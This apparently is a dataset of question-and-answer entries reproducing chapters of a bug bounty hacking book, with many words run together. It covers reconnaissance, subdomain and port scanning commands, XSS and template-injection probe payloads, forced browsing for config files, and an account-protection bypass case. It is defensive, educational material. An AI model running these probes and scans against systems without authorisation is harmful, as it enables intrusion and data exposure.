Andpossibly,executeaSQLinjectionifthememcachedatawasbeingstoredinthe\ndatabase\nTakeaways\nSubdomainsandbroadernetworkconfigurationsrepresentgreatpotentialfor\nhacking.Ifyounoticethataprogramisincluding*.SITE.cominit’sscope,tryto\nfindsubdomainsthatmaybevulnerableratherthangoingafterthelowhanging\nfruitonthemainsitewhicheveryonemaybesearchingfor.It’salsoworthyour\ntimetofamiliarizeyourselfwithtoolslikeNmap,eyewitness,knockpy,etc.which\nwillhelpyoufollowinAndy’sshoes.\n9. Bypassing Twitter Account Protections\nDifficulty: Easy\nUrl: twitter.com\nReport Link: N/A\nDate Reported: Bounty awarded October 2016\nBounty Paid: $560\nDescription:\nIn chatting with Karan Saini, he shared the following Twitter vulnerability with me so I\ncouldincludeitandshareithere.Whilethereportisn’tdisclosed(atthetimeofwriting),\nTwitterdidgivehimpermissiontosharethedetailsandthere’stwointerestingtakeaways\nfrom his finding.\nIn testing the account security features of Twitter, Karan noticed that when you at-\ntempted to log in to Twitter from an unrecognized IP address / browser for the first\nApplicationLogicVulnerabilities 184\ntime, Twitter may ask you for some account validation information such as an email or\nphonenumberassociatedwiththeaccount.Thus,ifanattackerwasabletocompromise\nyourusernameandpassword,theywouldpotentiallybestoppedfromloggingintoand\ntaking over your account based on this additional required information.\nHowever, undeterred, after Karan created a brand new account, used a VPN and tested\nthefunctionalityonhislaptopbrowser,hethenthoughttousehisphone,connecttothe\nsame VPN and log into the account. Turns out, this time, he was not prompted to enter\nadditional information - he had direct access to the “victim’s” account. Additionally, he\ncould navigate to the account settings and view the user’s email address and phone\nnumber, thereby allowing him desktop access (if it mattered).\nIn response, Twitter validated and fixed the issue, awarding Karan $560.\nTakeaways\nIincludedthisexamplebecauseitdemonstratestwothings-first,whileitdoes\nreducetheimpactofthevulnerability,therearetimesthatreportingabugwhich\nassumes an attacker knows a victim’s user name and password is acceptable\nprovidedyoucanexplainwhatthevulnerabilityisanddemonstrateit’sseverity.\nSecondly,whentestingforapplicationlogicrelatedvulnerabilities,considerthe\ndifferent ways an application could be accessed and whether security related\nbehaviours are consistent across platforms. In this case, it was browsers and\nmobileapplicationsbutitalsocouldincludethirdpartyappsorAPIendpoints.\nSummary\nApplication logic based vulnerabilities don’t necessarily always involve code. Instead,\nexploitingtheseoftenrequiresakeeneyeandmorethinkingoutsideofthebox.Always\nbe on the lookout for other tools and services a site may be using as those represent a\nnewattackvector.ThiscanincludeaJavascriptlibrarythesiteisusingtorendercontent.\nMore often than not, finding these will require a proxy interceptor which will allow you\nto play with values before sending them to the site you are exploring. Try changing\nany values which appear related to identifying your account. This might include setting\nup two different accounts so you have two sets of valid credentials that you know will\nwork. Also look for hidden / uncommon endpoints which could expose unintentionally\naccessible functionality.\nAlso, be sure to consider consistency across the multiple ways the service can be ac-\ncessed,suchasviathedesktop,thirdpartyapps,mobileapplicationsorAPIs.Protections\noffered via one method may not be consistently applied across all others, thereby\ncreating a security issue.\nApplicationLogicVulnerabilities 185\nLastly,beonthelookoutfornewfunctionality-itoftenrepresentsnewareasfortesting!\nAnd if/when possible, automate your testing to make better use of your time."
  },
  {
    "input": "What are the key steps and tools recommended for starting a bug bounty program and gathering initial information about a target website?",
    "summary": "This chapter outlines the process of starting with a bug bounty program, emphasizing the importance of choosing the right target and using tools like KnockPy and ZAP for information gathering. It also covers how to map the technology stack and functionality of the site to identify potential vulnerabilities. The summary highlights key steps, including subdomain enumeration, using proxies to discover files and directories, testing APIs, and exploring mobile apps and GitHub repositories for sensitive information.",
    "output": "21. Getting Started\nThis chapter has been the most difficult to write, largely because of the variety of bug\nbountyprogramsthatexistandcontinuetobemadeavailable.Tome,thereisnosimple\nformula for hacking but there are patterns. In this chapter, I’ve tried to articulate how I\napproach a new site, including the tools that I use (all of which are included in the Tools\nchapter) and what I’ve learned of others. This is all based on my experience hacking,\ninterviewingsuccessfulhackers,readingblogsandwatchingpresentationsfromDefCon,\nBSides, and other security conferences.\nButbeforewebegin,Ireceivealotofemailsaskingmeforhelpandguidanceonhowto\ngetstarted.Iusuallyrespondtothosewitharecommendationthat,ifyou’rejuststarting\nout, choose a target which you’re likely to have more success on. In other words, don’t\ntarget Uber, Shopify, Twitter, etc. That isn’t to say you won’t be successful, but those\nprogramshaveverysmartandaccomplishedhackerstestingthemdailyandIthinkit’llbe\neasiertogetdiscouragedifthat’swhereyouspendyourtimewhenyou’rejustbeginning.\nI know because I’ve been there. Instead, I suggest starting out with a program that has\na broad scope and doesn’t pay bounties. These programs often attract less attention\nbecausetheydon’thavefinancialincentives.Now,Iknowitwon’tbeasrewardingwhen\na bug is resolved without a payment but having a couple of these under your belt will\nhelpmotivateyoutokeephackingandasyouimprove,you’llbeinvitedtoparticipatein\nprivate programs which is where you can make some good money.\nWith that out of the way, let’s get started.\nInformation Gathering\nAs you know from the examples detailed previously, there’s more to hacking that just\nopeningawebsite,enteringapayloadandtakingoveraserver.Therearealotofthings\nto consider when you’re targeting a new site, including:\n• What’s the scope of the program? All sub domains of a site or specific URLs? For\nexample, *.twitter.com, or just www.twitter.com?\n• How many IP addresses does the company own? How many servers is it running?\n• What type of site is it? Software as a Service? Open source? Collaborative? Paid vs\nFree?\n• What technologies are they using? Python, Ruby, PHP, Java? MSQL? MySQL, Post-\ngres, Microsoft SQL? Wordpress, Drupal, Rails, Django?\nGettingStarted 187\nThese are only some of the considerations that help define where you are going to look\nand how you’re going to approach the site. Familiarizing yourself with the program is a\nfirst step. To begin, if the program is including all sub domains but hasn’t listed them,\nyou’regoingtoneedtodiscoverthem.Asdetailedinthetoolssection,KnockPyisagreat\ntooltouseforthis.IrecommendcloningDanielMiessler’sSecListsGitHubrepositoryand\nusingthesubdomainslistinthe/Discover/DNSfolder.Thespecificcommandwouldbe:\nknockpydomain.com-w/PATH_TO_SECLISTS/Discover/DNS/subdomains-top1mil-110000.t\\\nxt\nThis will kick off the scan and save a csv file with the results. I recommend starting that\nandletting itrun in thebackground. Next, I recommendusing Jason Haddix’s(Technical\nDirector of Bugcrowd and Hacking ProTips #5 interviewee) enumall script, available on\nGitHubunderhisDomainrepo.ThisrequiresRecon-ngtobeinstalledandconfiguredbut\nhe has setup instructions in his readme file. Using his script, we’ll actually be scrapping\nGoogle, Bing, Baidu, etc. for sub domain names. Again, let this run in the background\nand it’ll create a file with results.\nUsingthesetwotoolsshouldgiveusagoodsetofsubdomainstotest.However,if,after\nthey’re finished, you still want to exhaust all options, IPV4info.com is a great website\nwhichlistsIPaddressesregisteredtoasiteandassociatedsubdomainsfoundonthose\naddresses. While it would be best to automate scrapping this, I typically will browse\nthis manually and look for interesting addresses as a last step during my information\ngathering.\nWhilethesubdomainenumerationishappeninginthebackground,nextItypicallystart\nworking on the main site of the bug bounty program, for example, www.drchrono.com.\nPreviously,IwouldjustjumpintousingBurpSuiteandexploringthesite.But,basedon\nPatrik Fehrenbach’s advice and awesome write ups, I now start the ZAP proxy, visit the\nsiteandthendoaForcedBrowsetodiscoverdirectoriesandfiles.Again,Iletthisrunin\nthebackground.Asanaside,I’musingZAPbecauseatthetimeofwriting,Idon’thavea\npaid version of Burp Suite but you could just as easily use that.\nHaving all that running, it’s now that I actually start exploring the main site and\nfamiliarizing myself with it. To do so, ensure you havethe Wappalyzer plug installed (it’s\navailable for FireFox, which I use, and Chrome). This allows us to immediately see what\ntechnologiesasiteisusingintheaddressbar.Next,IstartBurpSuiteanduseittoproxy\nallmytraffic.IfyouareusingthepaidversionofBurp,it’sbesttostartanewprojectfor\nthe bounty program you’ll be working on.\nAtthisstage,ItendtoleavethedefaultsofBurpSuiteasisandbeginwalkingthroughthe\nsite. In other words, I leave the scope completely untouched so all traffic is proxied and\nincluded in the resulting history and site maps. This ensures that I don’t miss any HTTP\ncalls made while interacting with the site. During this process, I’m really just exploring\nwhile keeping my eyes out for opportunities, including:\nGettingStarted 188\nThe Technology Stack\nWhat is the site developed with, what is Wappalyzer telling me? For example, is the site\nusingaFrameworklikeRailsorDjango?KnowingthishelpsmedeterminehowI’llbetest-\ning and how the site works. For example, when working on a Rails site, CSRF tokens are\nusuallyembeddedinHTMLheadertags(atleastfornewerversionsofRails).Thisishelp-\nfulfortestingCSRFacrossaccounts.RailsalsousesadesignpatternforURLswhichtypi-\ncallycorrespondsto/CONTENT_TYPE/RECORD_IDatthemostbasic.UsingHackerOneas\nan example, if you look at reports, their URLs are www.hackerone.com/reports/12345.\nKnowingthis,wecantrytopassrecordIDsweshouldn’thaveaccessto.There’salsothe\npossibility that developers may have inadvertently left json paths available disclosing\ninformation, like www.hackerone.com/reports/12345.json.\nI also look to see if the site is using a front end JavaScript library which interacts with a\nbackendAPI.Forexample,doesthesiteuseAngularJS?Ifso,IknowtolookforAngular\nInjection vulnerabilities and include the payload {{4*4}}[[5*5]] when submitting fields (I\nusebothbecauseAngularcanuseeitheranduntilIconfirmwhichtheyuse,Idon’twant\nto miss opportunities). The reason why an API returning JSON or XML to a template is\ngreat is because sometimes those API calls unintentionally return sensitive information\nwhich isn’t actually rendered on the page. Seeing those calls can lead to information\ndisclosure vulnerabilities as mentioned regarding Rails.\nLastly,andwhilethisbleedsintothenextsection,Ialsochecktheproxytoseethingslike\nwherefilesarebeingservedfrom,suchasAmazonS3,JavaScriptfileshostedelsewhere,\ncalls to third party services, etc.\nFunctionality Mapping\nThere’sreallynosciencetothisstageofmyhackingbuthere,I’mjusttryingtounderstand\nhow the site works. For example:\n• I set up accounts and note what the verification emails and URLs look like, being\non the lookout for ways to reuse them or substitute other accounts.\n• I note whether OAuth is being used with other services.\n• Istwofactorauthenticationavailable,howisitimplemented-withanauthenticator\napp or does the site handle sending SMS codes?\n• Does the site offer multiple users per account, is there a complex permissions\nmodel?\n• Is there any inter-user messaging allowed?\n• Are any sensitive documents stored or allowed to be uploaded?\n• Are any type of profile pictures allowed?\n• Does the site allow users to enter HTML, are WYSIWYG editors used?\nGettingStarted 189\nThese are just a few examples. During this process, I’m really just trying to understand\nhowtheplatformworks andwhatfunctionalityis availabletobe abused.Itryto picture\nmyself as the developer and imagine what could have been implemented incorrectly or\nwhatassumptionscouldhavebeenmade,preppingforactualtesting.Itrymybestnotto\nstarthackingrightawayhereasit’sreallyeasytogetdistractedorcaughtuptryingtofind\nXSS, CSRF, etc. vulnerabilities submitting malicious payloads everywhere. Instead, I try\nto focus on understanding and finding areas that may provide higher rewards and may\nnothavebeenthoughtofbyothers.But,thatsaid,ifIfindabulkimporterwhichaccepts\nXML,I’mdefinitelystoppingmyexplorationanduploadingaXXEdocument,whichleads\nme into my actual testing.\nApplication Testing\nNowthatwehaveanunderstandingofhowourtargetworks,it’stimetostarthacking.At\nthis stage, some others may use automated scanners to crawl a site, test for XSS, CSRF,\netc. but truthfully, I don’t, at least right now. As such, I’m not going to speak to those\ntools, instead focusing on what my “manual” approach looks like.\nSo, at this stage, I tend to start using the site as is intended, creating content, users,\nteams, etc., injecting payloads anywhere and everywhere looking for anomalies and\nunexpected behaviour from the site when it returns that content. To do so, I’ll typically\nadd the payload <img src=”x” onerror=alert(1)> to any field which will accept it, and\nif I know that a templating engine (e.g., Angular) is being used, I’ll add a payload in the\nsame syntax, like {{4*4}}[[5*5]]. The reason I use the img tag is because it’s designed to\nfail since the image x shouldn’t be found. As a result, the onerror event should execute\ntheJavaScriptfunctionalert.WiththeAngularpayloads,I’mhopingtoseeeither16or25\nwhichmayindicatethepossibilityofpassingapayloadtoexecuteJavaScript,depending\non the version of Angular.\nOnthatnote,aftersavingthecontent,Ichecktoseehowthesiteisrenderingmycontent,\nwhetheranyspecialcharactersareencoded,attributesstripped,whethertheXSSimage\npayloadexecutes,etc.Thisgivesmeanideaofhowthesitehandlesmaliciousinputand\ngives me an idea of what to look for. I typically do not spend a lot of time doing this\nor looking for such simple XSS because these vulnerabilities are usually considered low\nhanging fruit and often reported quickly.\nAsaresult,I’llmoveontomynotesfromthefunctionalmappinganddiggingintotesting\neachareawithparticularattentionbeingpaidtotheHTTPrequestsandresponsesbeing\nsentandreceived.Again,thisstagereallydependsonthefunctionalityofferedbyasite.\nFor example, if a site hosts sensitive file uploads, I’ll test to see if the URLs to those\nfiles can be enumerated or accessed by an anonymous user or someone signed into a\ndifferent account. If there is a WYSIWYG, I’ll try intercepting the HTTP POST request and\nadd additional HTML elements like images, forms, etc.\nGettingStarted 190\nWhile I’m working through these areas, I keep an eye out for:\n• The types of HTTP requests that change data have CSRF tokens and are validating\nthem? (CSRF)\n• Whether there are any ID parameters that can be manipulated (Application Logic)\n• Opportunities to repeat requests across two separate user accounts (Application\nLogic)\n• Any XML upload fields, typically associated with mass record imports (XXE)\n• URL patterns, particularly if any URLs include record IDs (Application Logic, HPP)\n• Any URLs which have a redirect related parameter (Open Redirect)\n• Any requests which echo URL parameters in the response (CRLF, XSS, Open\nRedirect)\n• Server information disclosed such as versions of PHP, Apache, Nginx, etc. which\ncan be leveraged to find unpatched security bugs\nA good example of this was my disclosed vulnerability against MoneyBird. Walking\nthrough their functionality, I noticed that they had team based functionality and the\nability to create apps which gave access to an API. When I tested registering the app, I\nnoticedtheywerepassingthebusinessIDtotheHTTPPOSTcall.So,Itestedregistering\napps against teams I was a part of but should not have had permission to create apps\nfor.Sureenough,Iwassuccessful,theappwascreatedandIreceivedanaboveaverage\n$100 bounty from them.\nAtthispoint,it’sbesttoflipbacktoZAPandseewhat,ifany,interestingfilesordirectories\nhave been found via the brute forcing. You’ll want to review those findings and visit the\nspecificpages,especiallyanythingwhichmaybesensitivelike.htpasswd,settings,config,\netc.files.Additionally,usingBurp,youshouldnowhaveadecentsitemapcreatedwhich\ncanbereviewedforpagesthatBurpfoundbutweren’tactuallyvisited.AndwhileIdon’t\ndothis,JasonHaddixdiscussesitduringhisDefCon23presentation,HowtoShotWeb,it’s\npossibletotakethesitemapsandhaveBurp,andothertools,doautomaticcomparisons\nacross accounts and user permissions. This is on my list of things to do but until now,\nmy work has largely been manual, which takes us to the next section.\nDigging Deeper\nWhile most of this hacking has been manual, this obviously doesn’t scale well. In order\nto be successful on a broader scale, it’s important to automate as much as we can. We\ncan start with the results from our KnockPy and enumall scans, both of which provide\nus with lists of sub domains to checkout. Combining both lists, we can take the domain\nnames and pass them to a tool like EyeWitness. This will take screen shots from all the\nsub domains listed which are available via ports like 80, 443, etc. to identify what the\nGettingStarted 191\nsite looks like. Here we’ll be looking for sub domain take overs, accessible web panels,\ncontinuous integration servers, etc.\nWe can also take our list of IPs from KnockPy and pass it to Nmap to begin looking for\nopenportsandvulnerableservices.Remember,thisishowAndyGillmade$2,500from\nPornHub, finding an open Memcache installation. Since this can take a while to run,\nyou’ll want to start this and let it run in the background again. The full functionality of\nNmap is beyond the scope of this book but the command would look like nmap -sSV\n-oA OUTPUTFILE -T4 -iL IPS.csv. Here we are telling Nmap to scan the top 1000 most\ncommon ports, give us the service version information for any open ports, write it to an\noutput file and use our csv file as a list of IPs to scan.\nGoing back to the program scope, it’s also possible that mobile applications may be in\nscope. Testing these can often lead to finding new API endpoints vulnerable to hacking.\nTodoso,you’llneedtoproxyyourphonetrafficthroughBurpandbeginusingthemobile\napp. This is one way to see the HTTP calls being made and manipulate them. However,\nsometimes apps will use SSL pinning, meaning it will not recognize or use the Burp SSL\ncertificate, so you can’t proxy the app’s traffic. Getting around this is more difficult and\nbeyond the scope of this book (at least at this time) but there is documentation on how\nto address that and Arne Swinnen has a great presentation from BSides San Francisco1\nabout how he addressed this to test Instagram.\nEvenwithoutthat,therearemobilehackingtoolswhichcanhelptestapps.WhileIdon’t\nhave much experience with them (at least at this time), they are still an option to use.\nThis includes Mobile Security Framework and JD-GUI, both of which are included in the\nToolschapterandwereusedbyhackerstofindanumberofvulnerabilitiesagainstUber\nand it’s API.\nIf there is no mobile app, sometimes programs still have an extensive API which could\ncontain countless vulnerabilities - Facebook is a great example. Philippe Harewood\ncontinuestoexposevulnerabilitiesinvolvingaccesstoallkindsofinformationdisclosure\nonFacebook.Hereyou’llwanttoreviewthedeveloperdocumentationfromthesiteand\nbegin looking for abnormalities. I’ve found vulnerabilities testing the scopes provided\nby OAuth, accessing information I shouldn’t have access to (OAuth scopes are like\npermissions, defining what an application can have access to, like your email address,\nprofile information, etc). I’ve also found functionality bypasses, using the API to do\nthingsIshouldn’thaveaccesstowithafreeaccount(consideredavulnerabilityforsome\ncompanies).YoucanalsotestaddingmaliciouscontentviatheAPIasaworkaroundifa\nsite is stripping payloads during submission on its website.\nAnother tool which I’ve only recently started using based on the presentations by Fran\nRosen is GitRob. This is an automated tool which will search for public GitHub repos-\nitories of a target and look for sensitive files, including configurations and passwords.\nIt will also crawl the repositories of any contributors. In his presentations, Frans talks\n1https://www.youtube.com/watch?v=dsekKYNLBbc\nGettingStarted 192\nabouthavingfoundSalesforcelogininformationinacompany’spublicrepowhichledto\na big payout. He’s also blogged about finding Slack keys in public repos, which also led\nto big bounties.\nLastly,again,asrecommendedbyFrans,paywallssometimesofferaripeareaforhack-\ning.WhileIhaven’texperiencedthismyself,Fransmentionshavingfoundvulnerabilities\ninpaidfunctionalitywhichmostotherhackerslikelyavoidedbecauseoftheneedtopay\nfortheservicewhichwasbeingtested.Ican’tspeaktohowsuccessfulyoumightbewith\nthis,butitseemslikeaninterestingareatoexplorewhilehacking,assumingthepriceis\nreasonable.\nSummary\nWith this chapter, I’ve tried to help shed some light on what my process looks like to\nhelpyoudevelopyourown.Todate,I’vefoundthemostsuccessafterexploringatarget,\nunderstandingwhatfunctionalityitprovidesandmappingthattovulnerabilitytypesfor\ntesting. However, one of the areas which I’m continuing to explore, and encourage you\nto do as well, is automation. There are a lot of hacking tools available which can make\nyourlifeeasier,Burp,ZAP,Nmap,KnockPy,etc.aresomeofthefewmentionedhere.It’s\na good idea to keep these in mind as you hack to make better use of your time and drill\ndeeper. To conclude, here’s a summary of what we’ve discussed:\n1. Enumerateallsubdomains(iftheyareinscope)usingKnockPy,enumallRecon-ng\nscript and IPV4info.com\n2. StartZAPproxy,visitthemaintargetsiteandperformaForcedBrowsetodiscover\nfiles and directories\n3. Map technologies used with Wappalyzer and Burp Suite (or ZAP) proxy\n4. Explore and understand available functionality, noting areas that correspond to\nvulnerability types\n5. Begin testing functionality mapping vulnerability types to functionality provided\n6. Automate EyeWitness and Nmap scans from the KnockPy and enumall scans\n7. Review mobile application vulnerabilities\n8. Test the API layer, if available, including otherwise inaccessible functionality\n9. Look for private information in GitHub repos with GitRob\n10. Subscribe to the site and pay for the additional functionality to test"
  },
  {
    "input": "What are the key steps and considerations for writing a detailed and effective vulnerability report to a company's bug bounty program?",
    "summary": "Finding vulnerabilities is a challenging but rewarding process. It's important to read disclosure guidelines carefully to ensure your report is valid and not already known. Include detailed information like the URL, browser details, and steps to reproduce to help companies understand the issue. Always confirm the vulnerability before submitting and show respect for the company's processes. Additionally, be persistent and thorough in your research, as even well-known companies can have overlooked issues. Tools like Burp Suite, ZAP Proxy, and SQLmap are essential for effective vulnerability hunting.",
    "output": "22. Vulnerability Reports\nSo the day has finally come and you’ve found your first vulnerability. First off, congratu-\nlations! Seriously, finding vulnerabilities isn’t easy but getting discouraged is.\nMy first piece of advice is to relax, don’t get over excited. I know the feeling of being\noverjoyedatsubmittingareportandtheoverwhelmingfeelingofrejectionwhenyou’re\ntolditisn’tavulnerabilityandthecompanyclosesthereportwhichhurtsyourreputation\non the reporting platform.\nI want to help you avoid that. So, first thing’s first.\nRead the disclosure guidelines.\nOnbothHackerOneandBugcrowd,eachparticipatingcompanylistsinscopeandoutof\nscopeareasfortheprogram.Hopefullyyoureadthemfirstsoyoudidn’twasteyourtime.\nBut if you didn’t, read them now. Make sure what you found isn’t known and outside of\ntheir program.\nHere’s a painful example from my past - the first vulnerability I found was on Shopify, if\nyou submit malformed HTML in their text editor, their parser would correct it and store\nthe XSS. I was beyond excited. My hunting was paying off. I couldn’t submit my report\nfast enough.\nElated,Iclickedsubmitandawaitedmy$500bounty.Instead,theypolitelytoldmethat\nit was a known vulnerability and they asked researchers not to submit it. The ticket was\nclosed and I lost 5 points. I wanted to crawl in a hole. It was a tough lesson.\nLearn from my mistakes, READ THE GUIDELINES!\nInclude Details. Then Include More.\nIf you want your report to be taken seriously, provide a detailed report which includes,\nat a minimum:\n• The URL and any affected parameters used to find the vulnerability\n• A description of the browser, operating system (if applicable) and/or app version\n• Adescriptionoftheperceivedimpact.Howcouldthebugpotentiallybeexploited?\n• Steps to reproduce the error\nVulnerabilityReports 194\nThese criteria were all common from major companies on Hackerone including Yahoo,\nTwitter,Dropbox,etc.Ifyouwanttogofurther,I’drecommendyouincludeascreenshot\nor a video proof of concept (POC). Both are hugely helpful to companies and will help\nthem understand the vulnerability.\nAt this stage, you also need to consider what the implications are for the site. For\nexample, a stored XSS on Twitter has potential to be a very serious issue given the\nsheer number of users and interaction among them. Comparatively, a site with limited\ninteractionamongstusersmaynotseethatvulnerabilityassevere.Incontrast,aprivacy\nleak on a sensitive website like PornHub may be of greater importance than on Twitter,\nwhere most user information is already public (and less embarrassing?).\nConfirm the Vulnerability\nYou’vereadtheguidelines,you’vedraftedyourreport,you’veincludedscreenshots.Take\na second and make sure what you are reporting is actually a vulnerability.\nFor example, if you are reporting that a company doesn’t use a CSRF token in their\nheaders, have you looked to see if the parameters being passed include a token which\nacts like a CSRF token but just doesn’t have the same label?\nI can’t encourage you enough to make sure you’ve confirmed the vulnerability before\nyou submit the report. It can be a pretty big let down to think you’ve found a significant\nvulnerability only to realize you misinterpreted something during your tests.\nDo yourself the favour, take the extra minute and confirm the vulnerability before you\nsubmit it.\nShow Respect for the Company\nBased on tests with HackerOne’s company creation process (yes, you can test it as\na researcher), when a company launches a new bug bounty program, they can get\ninundated with reports. After you submit, allow the company the opportunity to review\nyour report and get back to you.\nSome companies post their time lines on their bounty guidelines while others don’t.\nBalance your excitement with their workload. Based on conversations I’ve had with\nHackerOnesupport,theywillhelpyoufollowupifyouhaven’theardfromacompanyin\nat least two weeks.\nBefore you go that route, post a polite message on the report asking if there is any\nupdate.Mosttimescompanieswillrespondandletyouknowthesituation.Iftheydon’t\ngivethemsometimeandtryagainbeforeescalatingtheissue.Ontheotherhand,ifthe\nVulnerabilityReports 195\ncompanyhasconfirmedthevulnerability,workwith themtoconfirmthefixonceit’sbe\ndone.\nIn writing this book, I’ve been lucky enough to chat with Adam Bacchus, a new member\nof the HackerOne team as of May 2016 who owns the title Chief Bounty Officer and\nour conversations really opened my eyes to the other side of bug bounties. As a bit of\nbackground,AdamhasexperiencewithSnapchatwhereheworkedtobridgethesecurity\nteam with the rest of the software engineering teams and Google, where he worked on\nthe Vulnerability Management Team and helped run the Google Vulnerability Reward\nProgram.\nAdam helped me to understand that there are a bunch of problems triagers experience\nrunning a bounty program, including:\n• Noise: Unfortunately, bug bounty programs receive a lot of invalid reports, both\nHackerOne and BugCrowd have written about this. I know I’ve definitely con-\ntributed and hopefully this book will help you avoid it because submitting invalid\nreports costs time and money for you and bounty programs.\n• Prioritization:Bountyprogramshavetofindsomewayofprioritizingvulnerability\nremediation. That’s tough when you have multiple vulnerabilities with similar\nimpact but combined with reports continuously coming in, bounty program face\nserious challenges keeping up.\n• Confirmations:Whentriagingareport,bugshavetobevalidated.Again,thistakes\ntime. That’s why it’s imperative that we hackers provide clear instructions and an\nexplanation about what we found, how to reproduce it and why it’s important.\nSimply providing a video doesn’t cut it.\n• Resourcing: Not every company can afford to dedicate full time staff to running\na bounty program. Some programs are lucky to have a single person respond to\nreports while others have staff split their time. As a result, companies may have\nrotatingscheduleswherepeopletaketurnsrespondingtoreports.Anyinformation\ngaps or delays in providing the necessary information has a serious impact.\n• Writingthefix:Codingtakestime,especiallyifthere’safulldevelopmentlifecycle\nincluding debugging, writing regression tests, staging deployments and finally a\npush to production. What if developers don’t even know the underlying cause of\nthevulnerability?Thisalltakestimewhilewe,thehackers,getimpatientandwant\ntobe paid. Thisis where clearlines of communication arekey and again,the need\nfor everyone to be respectful of each other.\n• Relationship management: Bug bounty programs want hackers to come back.\nHackerOne has written about how the impact of vulnerability grows as hackers\nsubmit more bugs to a single program. As a result, bounty programs need to find\na way to strike a balance developing these relationships.\n• Press Relations: There is always pressure that a bug might get missed, take too\nlongtoberesolved,orabountyisperceivedasbeingtoolow,andhackerswilltake\nVulnerabilityReports 196\ntoTwitterorthemedia.Again,thisweighsontriagersandhasimpactsonhowthey\ndevelop relationships and work with hackers.\nHavingreadallthis,mygoalisreallytohelphumanizethisprocess.I’vehadexperiences\non both ends of the spectrum, good and bad. However, at the end of the day, hackers\nand programs will be working together and having an understanding of the challenges\nthat each is facing will help improve outcomes all around.\nBounties\nIf you submitted a vulnerability to a company that pays a bounty, respect their decision\non the payout amount.\nAccording to Jobert Abma (Co-Founder of HackerOne) on Quora How Do I Become a\nSuccessful Bug Bounty Hunter?1:\nIf you disagree on a received amount, have a discussion why you believe it\ndeservesahigherreward.Avoidsituationswhereyouaskforanotherreward\nwithout elaboratingwhy you believe that. In return, a company should show\nrespect [for] your time and value.\nDon’t Shout Hello Before Crossing the Pond\nOn March 17, 2016, Mathias Karlsson wrote an awesome blog post about potentially\nfindingaSameOriginPolicy(SOP)bypass(asameoriginpolicyisasecurityfeaturewhich\ndefine how web browsers allow scripts to access content from websites) and was nice\nenough to let me include some of the content here. As an aside, Mathias has a great\nrecord on HackerOne - as of March 28, 2016, he’s 97th percentile in Signal and 95th for\nImpact with 109 bugs found, companies including HackerOne, Uber, Yahoo, CloudFlare,\netc.\nSo, “Don’t shout hello before you cross the pond” is a Swedish saying meaning you\nshouldn’t celebrate until you are absolutely certain. You can probably guess why I’m\nincluding this - hacking ain’t all sunshine and rainbows.\nAccordingtoMathias,hewasplayingwithFirefoxandnoticedthatthebrowserwouldac-\nceptmalformedhostnames(onOSX),sotheURLhttp://example.com..wouldloadexam-\nple.combutsendexample.com..inthehostheader.Hethentriedhttp://example.com￿evil.com\nand got the same result.\n1https://www.quora.com/How-do-I-become-a-successful-Bug-bounty-hunter\nVulnerabilityReports 197\nHe instantly knew that this mean SOP could be bypassed because Flash would treat\nhttp://example.com..evil.com as being under the *.evil.com domain. He checked the\nAlexa top 10000 and found that 7% of sites would be exploitable including Yahoo.com.\nHe created a writeup but decided to do some more confirming. He checked with a co-\nworker,yup,theirVirtualMachinealsoconfirmedthebug.HeupdatedFirefox,yup,bug\nwas still there. He then hinted on Twitter about the finding. According to him, Bug =\nVerified, right?\nNope.Themistakehemadewasthathedidn’tupdatehisoperatingsystemtothenewest\nversion.Afterdoingso,thebugwasdead.Apparentlythiswasreportedsixmonthsprior\nand updating to OSX Yosemite 10.10.5 fixed the issue.\nI include this to show that even great hackers can get it wrong and it’s important to\nconfirm the exploitation of a bug before reporting it.\nHugethankstoMathiasforlettingmeincludethis-IrecommendcheckingouthisTwitter\nfeed @avlidienbrunn and labs.detectify.com where Mathias wrote about this.\nParting Words\nHopefullythisChapterhashelpedyouandyou’rebetterpreparedtowriteakillerreport.\nBefore you hit send, take a moment and really think about the report - if it were to be\ndisclosed and read publicly, would you be proud?\nEverything you submit, you should be prepared to stand behind and justify it to the\ncompany, other hackers and yourself. I don’t say this to scare you off but as words\nof advice I wish I had starting out. When I began, I definitely submitted questionable\nreports because I just wanted to be on the board and be helpful. However, companies\nget bombarded. It’s more helpful to find a fully reproducible security bug and report it\nclearly.\nYoumaybewonderingwhoreallycares-letthecompaniesmakethatcallandwhocares\nwhatotherhackersthink. Fairenough.But atleastonHackerOne, yourreportsmatter-\nyour stats are tracked and each time you have a valid report, it is recorded against your\nSignal, a stat ranging from -10 to 7 which averages out the value of your reports:\n• Submit spam, you get -10\n• Submit a non-applicable, you get -5\n• Submit an informative, you get 0\n• Submit a report that is resolved, you get 7\nAgain, who cares? Well, Signal is now used to determine who gets invited to Private\nprogramsandwhocansubmitreportstopublicprograms.Privateprogramsaretypically\nVulnerabilityReports 198\nfresh meat for hackers - these are sites that are just getting into the bug bounty\nprogramandareopeningtheirsitetoalimitednumberofhackers.Thismeans,potential\nvulnerabilities with less competition.\nAs for reporting to other companies - use my experience as a warning story.\nI was invited to a private program and within a single day, found eight vulnerabilities.\nHowever, that night, I submitted a report to another program and was given an N/A.\nThis bumped my Signal to 0.96. The next day, I went to report to the private company\nagainandgotanotification-mySignalwastoolowandI’dhavetowait30daystoreport\nto them and any other company that had a Signal requirement of 1.0.\nThat sucked! While nobody else found the vulnerabilities I found during that time, they\ncouldhavewhichwouldhavecostmemoney.EverydayIcheckedtoseeifIcouldreport\nagain. Since then, I’ve vowed to improve my Signal and you should too!\nGood luck hunting!\n23. Tools\nBelowisalaundrylistoftoolswhichareusefulforvulnerabilityhunting,innoparticular\norder. While some automate the process of searching for vulnerabilities, these should\nnot replace manual work, keen observation and intuitive thinking.\nMichielPrins,Co-FounderofHackerone,deservesahugethanksforhelpingtocontribute\nto the list and providing advice on how to effectively use the tools.\nBurp Suite\nhttps://portswigger.net/burp\nBurp Suite is an integrated platform for security testing and pretty much a must when\nyou are starting out. It has a variety of tools which are helpful, including:\n• An intercepting proxy which lets you inspect and modify traffic to a site\n• AnapplicationawareSpiderforcrawlingcontentandfunctionality(eitherpassively\nor actively)\n• A web scanner for automating the detection of vulnerabilities\n• A repeater for manipulating and resending individual requests\n• A sequencer tool for testing the randomness of tokens\n• A comparer tool to compare requests and responses\nBucky Roberts, from the New Boston, has a tutorial series on Burp Suite available at\nhttps://vimeo.com/album/3510171 which provides an introduction to Burp Suite.\nZAP Proxy\nhttps://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project\nThe OWASP Zed Attack Proxy (ZAP) is a free, community based, open source platform\nsimilar to Burp for security testing. It also has a variety of tools, including a Proxy,\nRepeater, Scanner, Directory/File Bruteforcer, etc. It also supports add-ons so if you’re\na developer, you can create additional functionality. 